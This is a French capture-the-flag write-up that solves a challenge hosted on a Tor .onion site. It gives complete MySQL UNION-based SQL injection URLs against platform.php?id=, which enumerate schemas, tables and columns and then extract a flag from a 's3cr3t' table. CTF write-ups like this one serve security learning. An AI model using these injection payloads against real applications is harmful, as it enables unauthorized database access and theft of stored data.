# VOD - 256 points

L'adresse .onion indique que l'on doit utiliser le réseau Tor. Pour la simplicité j'ai commencé par (et n'ai finalement utilisé que cela) Tor Browser, soit Firefox pour Tor.
Quand on arrive sur le bon site (et pas ce que regarde les vieux monsieurs la nuit sur certains canaux de la TNT) on est face à une liste de produits, ici des services de VOD, sur lesquels on obtient plus d'informations en cliquant, ce qui nous amène au même url mais avec `?id=n`.
Il peut s'agir d'une base de données et derrière d'une injection SQL, ce qui est confirmé en ajoutant une simple apostrophe `'` après le chiffre.
On obtient alors une erreur mentionnant l'utilisation de `data_seek` dans ce qui est un fichier PHP.
La documentation nous dit alors qu'il s'agit de MySQL.

À partir de là on doit pouvoir utiliser `sqlmap` même à travers Tor mais j'ai simplement suivi des étapes analogues à celles de PayloadsAllTheThings pour les [injections MySQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) :

`http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=0%27%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata%20--+` donne les BDD : `|information_schema|,|vod|`

`http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=0%27%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=%22vod%22%20--+`

donne les tables de la BDD `vod` : `|platform|,|s3cr3t|`

`http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=0%27%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=%22s3cr3t%22%20--+` donne les fields de la table s3cr3t : `|id|,|flag|`

Reste à prendre flag dans la table s3cr3t : `http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=0%27%20UNION%20SELECT%201,2,flag%20from%20s3cr3t%20--+`